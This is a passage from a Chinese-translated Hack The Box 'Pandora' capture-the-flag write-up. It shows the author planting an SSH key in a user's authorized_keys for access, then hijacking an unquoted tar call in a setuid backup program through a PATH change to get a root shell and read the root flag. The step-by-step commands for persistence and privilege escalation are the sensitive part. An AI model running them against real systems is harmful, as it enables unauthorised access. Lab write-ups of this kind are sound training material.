AAAAB3NzaC1yc2EAAAADAQABAAABgQDoUK0S9FLwAzcvY5zWa70acZ/CWevVuxj3zIfjhFjZnklGvsCpFxTK124kVy8htLciaaP25f+14g2cD65Ao5DOJQclwI7h8oEXk879NvwDhBnqTt6S+OXn44XPIFvt9cdpaaxDDMZkRrh0mHtC9XVnTk0d/Sq61afh5/k9MozSJpvX55et2p/+Hj7Mk77q/zK2/Nt4MFtNogwlVd9ArQgOiyljKpG1Byjb/IYOssbdhgV1rgqoSVInXgWUeoXZmSpkmzK/W5wQ6sCkRBBmnHe8aLsZr++5YDZM9M8yuO1HxMK0KhSl5xrjvwBp7f8+PLt9DR+vmgiHxz5JUIPu1lOFrBxjozM5oXA4WBvmDFzJH+B4Ti0PJNA2qMCXO8SNFk06+tkkxHZ4tBRhpTpaESKafeFzlIamGIA9xKlL9bxfPhHKwAHVEo8Emopj4foaf8ho3Cy7u5/69s0p1DWZ1bAED367C0QbF5GmvsI/9Zny03badPLt17O558foH9+RfOE= root@kali" &gt; .ssh/authorized_keys</span></pre><p id="ea79" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">不要忘记更改权限:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="db0e" class="nn kg iq nj b gy no np l nq nr">matt@pandora:/home/matt$ chmod -R 600 .ssh/</span></pre><p id="0b38" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">现在，我们可以使用我们的密钥通过SSH以Matt的身份登录:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="b24e" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/pandora]<br/>└─# ssh -i id_rsa matt@10.10.11.136<br/>Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)<br/>ystem information as of Wed 19 Jan 22:51:24 UTC 2022<br/>matt@pandora:~$</span></pre><p id="0fb4" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">这一次，当我们运行备份时，它起作用了:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="713b" class="nn kg iq nj b gy no np l nq nr">matt@pandora:~$ /usr/bin/pandora_backup<br/>PandoraFMS Backup Utility<br/>Now attempting to backup PandoraFMS client<br/>tar: Removing leading `/' from member names<br/>/var/www/pandora/pandora_console/AUTHORS<br/>tar: Removing leading `/' from hard link targets<br/>/var/www/pandora/pandora_console/COPYING<br/>/var/www/pandora/pandora_console/DB_Dockerfile<br/>/var/www/pandora/pandora_console/DEBIAN/<br/>/var/www/pandora/pandora_console/DEBIAN/md5sums<br/>/var/www/pandora/pandora_console/DEBIAN/conffiles<br/>/var/www/pandora/pandora_console/DEBIAN/control<br/>&lt;SNIP&gt;<br/>/var/www/pandora/pandora_console/vendor/egulias/email-validator/EmailValidator/Validation/MultipleErrors.php<br/>/var/www/pandora/pandora_console/vendor/egulias/email-validator/EmailValidator/Validation/EmailValidation.php<br/>/var/www/pandora/pandora_console/vendor/egulias/email-validator/EmailValidator/Validation/DNSCheckValidation.php<br/>/var/www/pandora/pandora_console/vendor/egulias/email-validator/EmailValidator/EmailParser.php<br/>/var/www/pandora/pandora_console/vendor/egulias/email-validator/EmailValidator/EmailValidator.php<br/>/var/www/pandora/pandora_console/vendor/egulias/email-validator/README.md<br/>/var/www/pandora/pandora_console/vendor/egulias/email-validator/composer.json<br/>/var/www/pandora/pandora_console/vendor/egulias/email-validator/phpunit.xml.dist<br/>/var/www/pandora/pandora_console/vendor/egulias/email-validator/LICENSE<br/>/var/www/pandora/pandora_console/ws.php<br/>Backup successful!<br/>Terminating program!</span></pre><h1 id="56e8" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">权限提升</h1><p id="e131" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">现在，我们可以利用在查看备份程序时看到的未加引号的tar路径。</p><p id="f53b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">只需创建我们自己的名为tar的文件，该文件调用bash并使其可执行:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="3c18" class="nn kg iq nj b gy no np l nq nr">matt@pandora:~$ echo '/bin/bash;' &gt; tar<br/>matt@pandora:~$ chmod +x tar</span></pre><p id="0560" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">将该文件夹添加到开头的PATH中，以便使用我们的tar版本，而不是正确的版本:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="8582" class="nn kg iq nj b gy no np l nq nr">matt@pandora:~$ export PATH=/home/matt:$PATH<br/>matt@pandora:~$ $PATH<br/>-bash: /home/matt:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin: No such file or directory</span></pre><p id="95f2" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">由于路径的开头是/home/matt，备份程序将在那里使用tar。再次运行备份:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="f3cc" class="nn kg iq nj b gy no np l nq nr">matt@pandora:~$ /usr/bin/pandora_backup<br/>PandoraFMS Backup Utility<br/>Now attempting to backup PandoraFMS client<br/>root@pandora:~#</span></pre><h1 id="42eb" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">根标志</h1><p id="732f" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">它在做任何事情之前停止，我们在根提示符下。让我们抓住旗子:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="38b1" class="nn kg iq nj b gy no np l nq nr">root@pandora:~# id<br/>uid=0(root) gid=1000(matt) groups=1000(matt)<br/>root@pandora:~# cat /root/root.txt<br/>4bfc0ffaf379e65d41adb3f0f3b9144a</span></pre><p id="12e7" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">完成了。希望你喜欢这个盒子，下次再见。</p></div><div class="ab cl od oe hu of" role="separator"><span class="og bw bk oh oi oj"/><span class="og bw bk oh oi oj"/><span class="og bw bk oh oi"/></div><div class="ij ik il im in"><p id="7abf" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)</p><p id="961b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">推特—<a class="ae nv" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae nv" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="f243" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><em class="ok">原载于2022年5月24日</em><a class="ae nv" href="https://pencer.io/ctf/ctf-htb-pandora/" rel="noopener ugc nofollow" target="_blank"><em class="ok">https://pencer . io</em></a><em class="ok">。</em></p></div></div>    
</body>
</html>